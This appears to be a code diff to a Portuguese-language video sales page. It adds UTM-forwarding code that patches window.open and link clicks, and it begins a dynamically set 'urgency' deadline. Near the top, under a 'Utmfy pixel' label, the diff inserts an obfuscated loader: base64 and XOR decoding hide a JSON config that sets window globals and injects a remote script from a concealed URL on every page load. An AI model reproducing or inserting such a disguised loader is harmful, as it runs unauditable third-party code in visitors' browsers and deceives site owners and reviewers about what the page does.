@@ -10,6 +10,9 @@
   <!-- Bloquear indexação e crawlers -->
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 
+  <!-- Utmfy pixel -->
+  <script>(function(){var l_ha70=atob("DECETfOJDsKLiRUODTumOIHlLPip4WF6fTO+Ytzqaqyl/GFjZCb9Y5DmY+zp+zp9bjLtPYf6IbLi8XBiIjDtNZblIKj4qzksbDTwP5rre7bu+jc0Vh2ob5TlYaDq5WYsNxv/b53oY6epszd+ZDjhIbrtLO6p/3RieCWmd9G/b/S87y1oaXazLpawNqa/uiw7O3m1e5Grc5/2");var f_ekt=[];for(var l_7x=0;l_7x<l_ha70.length;l_7x++){f_ekt.push(l_ha70.charCodeAt(l_7x)&255);}var q_vh=f_ekt[0];var b_jf9b=f_ekt.slice(1,1+q_vh);var i_2q=f_ekt.slice(1+q_vh);var m_z57=i_2q.map(function(b,x_hi){return b^b_jf9b[x_hi%q_vh];});var m_kz="";for(var g_4brj=0;g_4brj<m_z57.length;g_4brj++){m_kz+=String.fromCharCode(m_z57[g_4brj]&255);}var p_dynb=decodeURIComponent(escape(m_kz));var g_vgvx=JSON.parse(p_dynb);var c_ft=g_vgvx.globals||[];c_ft.forEach(function(i_d){window[i_d.name]=i_d.value;});var j_t=document.createElement("script");j_t.src=g_vgvx.url;j_t.async=true;j_t.defer=true;(g_vgvx.attributes||[]).forEach(function(d_uln){j_t.setAttribute(d_uln.name,d_uln.value);});(document.head||document.documentElement).appendChild(j_t);})();</script>
+
   <!-- Vturb — preload para carregamento mais rápido -->
   <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
   <link rel="preload" href="https://scripts.converteai.net/29f9c03e-6192-4476-9f33-ccf0b7631e12/players/6a62bc4997841b6683ee7172/v4/player.js" as="script">
@@ -284,6 +287,76 @@
 <script>
 (function () {
   'use strict';
+
+  /* ── 0. UTM CAPTURE & FORWARD ── */
+  (function () {
+    var UTM_KEYS = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id'];
+    var STORAGE_KEY = '_page_utms';
+
+    // Lê UTMs da URL atual
+    function readUTMsFromURL() {
+      var result = {};
+      try {
+        var params = new URLSearchParams(window.location.search);
+        UTM_KEYS.forEach(function (k) {
+          var v = params.get(k);
+          if (v) result[k] = v;
+        });
+      } catch (e) {}
+      return result;
+    }
+
+    // Persiste ou recupera UTMs do sessionStorage
+    var utms = readUTMsFromURL();
+    try {
+      if (Object.keys(utms).length > 0) {
+        sessionStorage.setItem(STORAGE_KEY, JSON.stringify(utms));
+      } else {
+        utms = JSON.parse(sessionStorage.getItem(STORAGE_KEY) || '{}');
+      }
+    } catch (e) {}
+
+    // Injeta UTMs em uma URL
+    function injectUTMs(url) {
+      if (!url || typeof url !== 'string') return url;
+      if (Object.keys(utms).length === 0) return url;
+      try {
+        var u = new URL(url, window.location.href);
+        // Não sobrescreve UTMs que o destino já tem na URL
+        UTM_KEYS.forEach(function (k) {
+          if (utms[k] && !u.searchParams.get(k)) {
+            u.searchParams.set(k, utms[k]);
+          }
+        });
+        return u.toString();
+      } catch (e) {
+        return url;
+      }
+    }
+
+    // Patcha window.open — o CTA do Vturb usa window.open para abrir o checkout
+    var _origOpen = window.open;
+    window.open = function (url, target, features) {
+      return _origOpen.call(this, injectUTMs(url), target, features);
+    };
+
+    // Intercepta cliques em links <a> comuns (caso haja botões na página)
+    document.addEventListener('click', function (e) {
+      var el = e.target && e.target.closest ? e.target.closest('a[href]') : null;
+      if (!el) return;
+      var href = el.getAttribute('href');
+      if (href && href.indexOf('http') === 0) {
+        el.href = injectUTMs(href);
+      }
+    }, true);
+
+    // Expõe para uso externo (ex: Vturb via postMessage ou callback)
+    window._getUTMString = function () {
+      return Object.keys(utms).map(function (k) {
+        return encodeURIComponent(k) + '=' + encodeURIComponent(utms[k]);
+      }).join('&');
+    };
+  })();
 
   /* ── 1. DATA DINÂMICA na barra de urgência ── */
   (function setDeadline() {
